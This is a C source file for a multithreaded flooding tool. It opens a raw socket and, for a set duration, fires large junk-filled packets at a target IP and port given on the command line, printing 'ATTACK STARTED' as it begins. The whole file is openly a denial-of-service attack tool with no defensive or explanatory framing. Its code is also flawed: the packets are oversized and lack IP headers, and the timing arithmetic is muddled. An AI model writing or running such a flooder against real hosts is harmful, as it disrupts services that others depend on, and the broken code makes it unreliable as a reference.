#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>

#define BUFFER_SIZE 65536
#define BATCH_SIZE 10

typedef struct {
    int sock;
    char *target_ip;
    int target_port;
    int duration;
    int *stop_flag;
} thread_args;

void *send_packets(void *arg) {
    thread_args *args = (thread_args *)arg;
    char buffer[BUFFER_SIZE * BATCH_SIZE];
    struct sockaddr_in target;

    target.sin_family = AF_INET;
    target.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target.sin_addr);

    struct timeval start, end;
    gettimeofday(&start, NULL);

    while (!(*args->stop_flag)) {
        for (int i = 0; i < BATCH_SIZE; i++) {
            memset(buffer + i * BUFFER_SIZE, 'A', BUFFER_SIZE);
        }
        if (sendto(args->sock, buffer, BUFFER_SIZE * BATCH_SIZE, 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
            perror("sendto failed");
        }
    }

    gettimeofday(&end, NULL);
    long seconds = (end.tv_sec - start.tv_sec);
    long micros = ((seconds * 1000000) + end.tv_usec) - (start.tv_usec);
    printf("Elapsed time: %ld seconds and %ld microseconds\n", seconds, micros);

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <duration> <thread_count>\n", argv[0]);
        return 1;
    }

    printf("ATTACK STARTED 🚀\n");

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    int sock;
    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    thread_args *args = malloc(thread_count * sizeof(thread_args));
    int stop_flag = 0;

    // Create a non-blocking raw socket
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
        perror("socket failed");
        return 1;
    }

    // Set socket to non-blocking
    if (fcntl(sock, F_SETFL, O_NONBLOCK) == -1) {
        perror("fcntl failed");
        return 1;
    }

    // Initialize thread arguments
    for (int i = 0; i < thread_count; i++) {
        args[i].sock = sock;
        args[i].target_ip = target_ip;
        args[i].target_port = target_port;
        args[i].duration = duration;
        args[i].stop_flag = &stop_flag;
    }

    // Create threads to send packets
    for (int i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, send_packets, &args[i]) != 0) {
            perror("pthread_create failed");
            return 1;
        }
    }

    // Sleep for the specified duration
    sleep(duration);

    // Stop threads
    stop_flag = 1;

    // Join threads
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    close(sock);
    free(threads);
    free(args);
    return 0;
}